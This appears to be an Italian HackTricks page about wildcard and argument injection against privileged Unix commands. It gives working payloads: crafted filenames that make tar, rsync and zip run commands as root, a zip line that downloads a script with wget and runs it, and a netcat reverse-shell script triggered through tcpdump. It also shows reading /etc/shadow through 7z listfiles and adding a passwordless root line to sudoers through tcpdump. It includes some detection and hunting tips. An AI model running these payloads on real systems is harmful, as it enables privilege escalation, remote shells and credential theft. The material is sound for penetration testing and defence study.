# Trucchi aggiuntivi con i Wildcards

{{#include ../../banners/hacktricks-training.md}}

> La **argument injection** tramite wildcard (detto anche *glob*) si verifica quando uno script privilegiato esegue un binary Unix come `tar`, `chown`, `rsync`, `zip`, `7z`, … con una wildcard non racchiusa tra virgolette, come `*`.
> Poiché la shell espande la wildcard **prima** di eseguire il binary, un attacker in grado di creare file nella working directory può creare nomi di file che iniziano con `-`, in modo che vengano interpretati come **options anziché dati**, inserendo di fatto flag arbitrari o persino comandi.<sup>[[6]](#references)</sup>
> Questa pagina raccoglie le primitive più utili, la ricerca recente e i rilevamenti moderni per il periodo 2023-2025.

## chown / chmod

È possibile **copiare owner/group o i permission bits da un file di riferimento** abusando del flag `--reference` quando un filename simile a un'opzione viene espanso da una wildcard.<sup>[[6]](#references)[[8]](#references)[[9]](#references)</sup>
```bash
# attacker-controlled directory
touch -- .drf.php
chmod 777 -- .drf.php
touch -- "--reference=.drf.php"   # ← filename becomes an argument
```
Quando root esegue in seguito qualcosa come:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
L'`--reference=.drf.php` espanso sovrascrive owner/mode espliciti, facendo sì che i file corrispondenti ereditino i metadati da `.drf.php` (e, con la configurazione precedente, rendendoli scrivibili dall'attacker).<sup>[[6]](#references)</sup>

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (attacco combinato).<sup>[[7]](#references)</sup>
Vedi anche il classico paper di DefenseCode per i dettagli.<sup>[[6]](#references)</sup>

---

## tar

### GNU tar

Esegui comandi arbitrari abusando della funzionalità **checkpoint** di GNU tar e delle azioni dei checkpoint.<sup>[[10]](#references)</sup>
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
```
Una volta che root esegue, ad esempio, `tar -czf /root/backup.tgz *`, `shell.sh` viene eseguito come root.<sup>[[10]](#references)</sup>

### Nota sull'override del compressor di bsdtar / macOS

Il `tar` predefinito nelle versioni recenti di macOS (basato su `libarchive`) non fornisce l'interfaccia `--checkpoint` di GNU tar, ma bsdtar documenta **--use-compress-program** per selezionare un compressor esterno.<sup>[[11]](#references)</sup>
```bash
# macOS example
touch -- "--use-compress-program=sh"
```
Quando uno script privilegiato esegue `tar -cf backup.tar *`, questo seleziona `sh` tramite il `PATH` della vittima e bsdtar lo avvia come compressore.<sup>[[11]](#references)</sup> Questo dimostra l'iniezione di opzioni, ma non costituisce di per sé una primitiva affidabile per l'esecuzione di comandi arbitrari: un filename creato tramite wildcard non può contenere `/`, e bsdtar fornisce dati dell'archivio anziché un comando shell scelto dall'attaccante. L'esecuzione di codice richiede inoltre un executable controllabile risolto tramite `PATH` o un altro canale di argomenti in grado di indicare un programma utile.

---

## rsync

`rsync` consente di sovrascrivere la shell remota o il binario remoto tramite flag della riga di comando come `-e` e `--rsync-path`.<sup>[[12]](#references)</sup>
```bash
# attacker-controlled directory
touch -- "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Se in seguito root archivia la directory con `rsync -az * backup:/srv/`, il flag iniettato può eseguire una shell tramite il meccanismo di remote shell.<sup>[[7]](#references)[[12]](#references)</sup>

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (modalità `rsync`).

---

## 7-Zip / 7z / 7za

Anche quando lo script privilegiato antepone *difensivamente* il prefisso `--` al wildcard (per impedire il parsing delle opzioni), la CLI di 7-Zip accetta **file di elenco** anteponendo `@` al nome del file. La combinazione con un symlink consente di *esfiltrare file arbitrari*.<sup>[[13]](#references)</sup>
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Se root esegue qualcosa come:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip proverà a leggere `root.txt` (→ `/etc/shadow`) come file list e terminerà, **stampando il contenuto su stderr**.<sup>[[13]](#references)</sup>

Questo funziona anche con `-- *` perché la CLI di 7-Zip accetta esplicitamente sia nomi di file normali sia `@listfiles` come input posizionali, quindi un nome di file letterale come `@root.txt` viene comunque trattato in modo speciale.<sup>[[13]](#references)</sup>

---

## zip

Esistono due primitive molto pratiche quando un'applicazione passa a `zip` nomi di file controllati dall'utente (tramite un wildcard oppure enumerando i nomi senza `--`).<sup>[[2]](#references)[[3]](#references)</sup>

- RCE via test hook: `-T` abilita il “test archive” e `-TT <cmd>` sostituisce il tester con un programma arbitrario (forma estesa: `--unzip-command <cmd>`). Se puoi iniettare nomi di file che iniziano con `-`, suddividi i flag tra nomi di file distinti affinché il parsing delle short-options funzioni.<sup>[[2]](#references)[[3]](#references)</sup>
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Note
- NON provare un singolo filename come `'-T -TT <cmd>'` — le short options vengono analizzate carattere per carattere e l'operazione fallirà. Usa token separati come mostrato.<sup>[[3]](#references)</sup>
- Se gli slash vengono rimossi dai filename dall'app, esegui il fetch da un host/IP nudo (percorso predefinito `/index.html`) e salva localmente con `-O`, quindi esegui.<sup>[[3]](#references)</sup>
- Puoi eseguire il debug del parsing con `-sc` (mostra gli argv elaborati) o `-h2` (ulteriore help) per capire come vengono consumati i tuoi token.<sup>[[3]](#references)</sup>

Esempio (comportamento locale su zip 3.0).<sup>[[3]](#references)</sup>
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak: Se il web layer restituisce lo stdout/stderr di `zip` (comune nei wrapper ingenui), i flag iniettati come `--help` o gli errori derivanti da opzioni errate compariranno nella risposta HTTP, confermando la command-line injection e facilitando la messa a punto del payload.<sup>[[3]](#references)</sup>

---

## Candidati aggiuntivi per l'opzione-injection

Quando un wrapper privilegiato espande una directory scrivibile usando un wildcard, vale la pena controllare questi hook documentati per le opzioni.<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>

| Binary | Flag to abuse | Effect |
| --- | --- | --- |
| `flock` | `-c <cmd>` | Passa una stringa di comando a una shell |
| `git`   | `-c core.sshCommand=<cmd>` | Usa `<cmd>` al posto di SSH per il fetch/push di Git |
| `scp`   | `-S <program>` | Usa un programma di connessione alternativo compatibile con SSH |

Queste primitive sono utili per controlli aggiuntivi oltre ai classici *tar/rsync/zip*.

---

## Ricerca di wrapper e job vulnerabili

I case study recenti e le indicazioni per il rilevamento mostrano che la wildcard/argv injection non è più soltanto un problema di **cron + tar**.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup> La stessa classe di bug continua a comparire in:

- funzionalità web che "scaricano tutto come zip/tar" da directory di upload controllate dall'attaccante
- debug shell di vendor/appliance che espongono un wrapper di **tcpdump** con campi filename/filtro controllati dall'attaccante
- job di backup o rotazione che eseguono `tar`, `rsync`, `7z`, `zip`, `chown` o `chmod` su directory scrivibili

Comandi utili per il triage (l'invocazione di `pspy` usa i flag documentati per gli eventi di processo/file e per l'intervallo).<sup>[[14]](#references)</sup>
```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
'(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
/etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
Euristiche rapide:

- `-- *` è una buona soluzione per molti strumenti GNU, ma **non** per `7z`/`7za`, perché `@listfiles` viene analizzato separatamente.<sup>[[13]](#references)</sup>
- Per `zip`, cerca wrapper che enumerano direttamente i nomi file controllati dall'utente; lo splitting delle short option (`-T` + `-TT <cmd>`) funziona comunque anche senza uno shell glob.<sup>[[2]](#references)[[3]](#references)</sup>
- Per `tcpdump`, presta particolare attenzione ai wrapper che permettono di controllare i **nomi dei file di output**, le **impostazioni di rotazione** o gli argomenti di **replay dei capture file**.<sup>[[18]](#references)</sup>

---

## tcpdump rotation hooks (-G/-W/-z): RCE via argv injection in wrappers

Quando una restricted shell o un wrapper del vendor costruisce una command line di `tcpdump` concatenando campi controllati dall'utente (ad esempio un parametro "file name") senza quoting/validazione rigorosi, puoi introdurre di nascosto flag aggiuntivi di `tcpdump`. La combinazione di `-G` (rotazione basata sul tempo), `-W` (limite del numero di file) e `-z <cmd>` (comando post-rotazione) consente l'esecuzione arbitraria di comandi come l'utente che esegue tcpdump (spesso root sugli appliance).<sup>[[1]](#references)[[4]](#references)[[18]](#references)</sup>

Prerequisiti:

- Puoi influenzare l'`argv` passato a `tcpdump` (ad esempio tramite un wrapper come `/debug/tcpdump --filter=... --file-name=<HERE>`).<sup>[[4]](#references)[[18]](#references)</sup>
- Il wrapper non esegue il sanitize degli spazi o dei token preceduti da `-` nel campo del nome file.<sup>[[4]](#references)</sup>

PoC classico (esegue uno script di reverse shell da un percorso scrivibile).<sup>[[4]](#references)[[18]](#references)</sup>
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Dettagli:

- `-G 1` ruota ogni secondo e `-W 1` si arresta dopo un file ruotato; la cattura deve ricevere un pacchetto corrispondente prima della rotazione.<sup>[[18]](#references)</sup>
- `-z <cmd>` esegue il comando post-rotazione una volta per ogni rotazione e passa come argomento il percorso del savefile chiuso; assicurati che la gestione degli argomenti dello script/interprete corrisponda al tuo payload.<sup>[[18]](#references)</sup>

Varianti senza supporti rimovibili:

- Se disponi di qualsiasi altra primitive per scrivere file (ad esempio, un wrapper di comandi separato che consenta il reindirizzamento dell'output), inserisci lo script in un percorso noto e attiva `-z /path/script.sh`; fai in modo che lo script invochi autonomamente `/bin/sh` se necessario.<sup>[[18]](#references)</sup>
- Se un wrapper del vendor consente di scegliere il percorso ruotato, analizza il controllo del percorso solo in combinazione con un comando post-rotazione che interpreti il suo argomento savefile; il solo controllo del percorso non esegue il contenuto dei file.<sup>[[18]](#references)</sup>

---

## sudoers: tcpdump con wildcard/argomenti aggiuntivi → scrittura/lettura arbitrarie e root

Esempio di anti-pattern di sudoers:<sup>[[3]](#references)</sup>
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
La regola lascia disponibili diverse opzioni nel parser documentato di `tcpdump`:<sup>[[3]](#references)[[18]](#references)</sup>
- Il glob `*` e i pattern permissivi limitano solo il primo argomento `-w`. `tcpdump` accetta più opzioni `-w`; prevale l'ultima.<sup>[[3]](#references)[[18]](#references)</sup>
- La regola non vincola le altre opzioni, quindi `-Z`, `-r`, `-V`, ecc. sono consentite.<sup>[[3]](#references)[[18]](#references)</sup>

Le primitive rilevanti sono documentate di seguito.<sup>[[3]](#references)[[18]](#references)</sup>
- Sovrascrivere il percorso di destinazione con un secondo `-w` (il primo soddisfa solo sudoers).<sup>[[3]](#references)[[18]](#references)</sup>
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Path traversal all'interno del primo `-w` per uscire dall'albero vincolato.<sup>[[3]](#references)</sup>
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Forza la proprietà dell'output con `-Z root` (crea file di proprietà di root ovunque).<sup>[[3]](#references)[[18]](#references)</sup>
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Scrittura di contenuto arbitrario riproducendo un PCAP creato ad hoc tramite `-r` (ad esempio, per inserire una riga in sudoers).<sup>[[3]](#references)[[18]](#references)</sup>

<details>
<summary>Crea un PCAP contenente il payload ASCII esatto e scrivilo come root</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Lettura arbitraria di file/leak di segreti con `-V <file>` (interpreta un elenco di savefile). Le diagnostiche degli errori spesso ripetono le righe, causando un leak del contenuto.<sup>[[3]](#references)[[18]](#references)</sup>
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## References

- [1] [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [2] [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [3] [0xdf - HTB Dump: injection di argomenti di zip a RCE + privesc tramite errata configurazione di tcpdump sudo](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [4] [FiberGateway GR241AG - Catena di exploit completa](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [5] [Elastic - Potenziale shell tramite wildcard injection rilevata](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)
- [6] [Back To The Future: wildcard Unix scatenate (DefenseCode)](https://www.exploit-db.com/papers/33930)
- [7] [wildpwn](https://github.com/localh0t/wildpwn)
- [8] [Invocazione di `chown` di GNU Coreutils](https://www.gnu.org/software/coreutils/manual/html_node/chown-invocation.html)
- [9] [Invocazione di `chmod` di GNU Coreutils](https://www.gnu.org/software/coreutils/manual/html_node/chmod-invocation.html)
- [10] [Checkpoint di GNU tar](https://www.gnu.org/software/tar/manual/html_section/checkpoints.html)
- [11] [Manuale di bsdtar(1)](https://man.freebsd.org/cgi/man.cgi?query=bsdtar&sektion=1)
- [12] [Manuale di rsync(1)](https://download.samba.org/pub/rsync/rsync.1)
- [13] [Sintassi della riga di comando di 7-Zip](https://7-zip.opensource.jp/chm/cmdline/syntax.htm)
- [14] [pspy](https://github.com/DominicBreuker/pspy)
- [15] [Manuale di flock(1)](https://kernel.googlesource.com/pub/scm/utils/util-linux/util-linux/+/refs/tags/v2.41.1/sys-utils/flock.1.adoc)
- [16] [Documentazione della configurazione di Git](https://git-scm.com/docs/git-config)
- [17] [Manuale di `scp` di OpenBSD](https://man.openbsd.org/scp)
- [18] [Manuale di tcpdump(8)](https://man7.org/linux/man-pages/man8/tcpdump.8.html)
{{#include ../../banners/hacktricks-training.md}}
